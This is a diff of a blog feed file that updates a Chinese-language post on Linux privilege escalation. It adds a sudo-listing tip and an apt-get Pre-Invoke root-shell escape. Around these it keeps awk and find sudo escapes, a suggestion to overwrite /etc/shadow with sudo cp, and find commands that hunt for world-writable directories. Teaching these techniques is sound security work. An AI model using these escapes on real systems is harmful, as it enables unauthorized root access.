@@ -858,7 +858,7 @@
     <link href="http://kevien.github.io/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     <id>http://kevien.github.io/2017/10/10/linux权限提升/</id>
     <published>2017-10-10T04:35:24.000Z</published>
-    <updated>2019-01-16T16:30:03.947Z</updated>
+    <updated>2019-01-21T09:02:13.167Z</updated>
     
     <content type="html"><![CDATA[<p><img src="/2017/10/10/linux权限提升/linuxprivilegeescalation.jpg" alt=""></p>
 <h2 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h2><ul>
@@ -909,7 +909,7 @@
 </li>
 </ul>
 <h2 id="滥用sudo权限"><a href="#滥用sudo权限" class="headerlink" title="滥用sudo权限"></a>滥用sudo权限</h2><ul>
-<li>如果你的shell可以通过sudo去访问某些程序且无需密码，这个时候就有可能进行提权，例如你可以sudo cp，那么就可以覆盖/etc/shadow 或者/etc/sudoers </li>
+<li>如果你的shell可以通过sudo去访问某些程序且无需密码(通过sudo -l,或者查看/etc/sudoers文件)，这个时候就有可能进行提权，例如你可以sudo cp，那么就可以覆盖/etc/shadow 或者/etc/sudoers</li>
 <li>这些命令有 awk、bash、cp等</li>
 <li><p>awk</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</div></pre></td></tr></table></figure>
@@ -934,8 +934,13 @@
 <li>find <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo find /home -exec sh -i \;</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><img src="/2017/10/10/linux权限提升/find.png" alt=""><br><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">how-i-got-root-with-sudo</a><br><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" target="_blank" rel="external">Linux Restricted Shell Bypass</a></p>
-<h2 id="以root权限运行的脚本文件"><a href="#以root权限运行的脚本文件" class="headerlink" title="以root权限运行的脚本文件"></a>以root权限运行的脚本文件</h2><ul>
+<p><img src="/2017/10/10/linux权限提升/find.png" alt=""></p>
+<ul>
+<li><p>其它 apt-get/yum/dpkg </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update -o APT::Update::Pre-Invoke::=”/bin/bash -i”</div></pre></td></tr></table></figure>
+</li>
+<li><p>总而言之就是NOPASSWORD的程序都需要特别关注。<br><a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="external">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration</a><br><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">how-i-got-root-with-sudo</a><br><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" target="_blank" rel="external">Linux Restricted Shell Bypass</a></p>
+<h2 id="以root权限运行的脚本文件"><a href="#以root权限运行的脚本文件" class="headerlink" title="以root权限运行的脚本文件"></a>以root权限运行的脚本文件</h2></li>
 <li>如果你发现一个脚本是root所有但是可以被任何用户写，这时你就可以添加你恶意的代码到这脚本中从而实现提权操作。其中最常见的是计划任务脚本。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#World writable files directories</div><div class="line">find / -writable -type d 2&gt;/dev/null</div><div class="line">find / -perm -222 -type d 2&gt;/dev/null</div><div class="line">find / -perm -o w -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World executable folder</div><div class="line">find / -perm -o x -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World writable and executable folders</div><div class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</div></pre></td></tr></table></figure>
 </li>
 </ul>
